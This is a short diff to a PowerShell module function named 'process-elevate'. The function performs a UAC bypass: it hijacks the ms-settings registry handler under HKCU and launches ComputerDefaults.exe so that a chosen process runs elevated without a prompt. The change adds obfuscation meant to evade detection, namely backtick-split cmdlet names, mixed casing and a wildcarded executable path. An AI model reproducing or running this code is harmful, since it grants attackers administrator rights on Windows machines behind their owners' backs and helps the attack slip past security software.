@@ -239,11 +239,10 @@ function process-elevate {
 		[string]$processName
     )
     $Request =  $processName
-nEw-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+n`E`w-I`t`em "HKCU:\software\classes\ms-settings\shell\open\command" -Force
 N`e`w-It`e`mProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -force
 S'e't-It'emPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -Force
-clear
-sTaRt-PrOcESs "C:\Windows\System32\ComputerDefaults.exe"
+sTaRt-PrOcESs "$env:?????\Wi*\S*3*\C??pu??rD??a??ts.exe"
 }
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
